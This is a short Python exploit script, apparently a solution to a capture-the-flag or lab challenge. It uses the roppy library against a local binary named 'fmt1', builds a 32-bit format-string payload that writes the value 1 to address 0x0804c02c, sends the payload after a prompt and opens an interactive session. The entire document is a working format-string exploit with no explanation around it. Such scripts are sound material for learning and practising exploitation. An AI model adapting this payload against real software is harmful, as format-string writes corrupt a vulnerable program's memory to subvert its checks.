from roppy import *

p = process("./fmt1")



payload = fmtstr32(7, {0x0804c02c: 1})
p.sendlineafter(b":", payload)
p.interactive()